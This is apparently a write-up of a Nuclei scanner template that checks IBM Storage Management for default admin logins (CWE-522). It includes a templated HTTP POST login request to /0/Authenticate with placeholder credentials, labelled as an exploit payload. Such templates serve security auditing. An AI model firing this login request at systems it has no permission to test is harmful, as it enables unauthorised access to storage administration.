# Nuclei Template: IBM Storage Management Default Login
**Template ID:** ibm-storage-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ibm-storage-default-credential.yaml`)

## Vulnerability Information & PoC

## Description
IBM Storage Management default admin login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /0/Authenticate HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

j_username={{username}}&j_password={{password}}&continue=&submit=submit+form
```

## References
- https://www.ibm.com/docs/en/power-sys-solutions/0008-ESS?topic=5148-starting-elastic-storage-server-management-server-gui
